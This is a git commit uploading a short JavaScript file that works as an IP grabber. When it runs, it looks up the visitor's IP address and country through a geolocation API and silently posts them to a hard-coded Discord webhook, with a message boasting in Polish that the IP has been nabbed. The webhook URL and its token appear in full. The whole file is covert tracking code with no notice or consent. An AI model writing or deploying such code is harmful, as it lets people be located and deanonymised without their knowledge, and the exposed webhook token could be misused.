b66b5d6fbdab01b0f6d150304cc9e8de3bc1ec6d
SkrrrPow907 <112420083+SkrrrPow907@users.noreply.github.com>
2024-12-29 02:07:19 +0100

    Add files via upload

---
+++ javascript.js
@@ -0,0 +1,36 @@
+var webHookUrl = "https://discord.com/api/webhooks/1318715773509959761/nWc9aOc7QroCxol4iZc5cJdCOWZcg-3c22d9K4WGRHabvAsa5B40cmO9eXvXW4d4BR8c-";
+
+$.getJSON('https://api.db-ip.com/v2/free/self', function(data) {
+  console.log(JSON.stringify(data, null, 2));
+});
+
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://api.db-ip.com/v2/free/self');
+    const data = await response.json();
+    console.log(data);
+
+    // Declaring variables
+    var ip = data.ipAddress;
+    var country = data.countryName;
+
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username:   "Zapierdalacz IP",
+        avatar_url: "",
+        content:    "**IP ZAJEBANE :D** @here \n" + 
+		    "__**:globe_with_meridians: IP Address:**__ \n" +
+                    "`" + ip + "` \n \n" +
+		    "__**Country:**__ \n" +
+		    "`" + country + "`"
+    }
+
+    postRequest.send(JSON.stringify(params));
+
+}
+
+request();
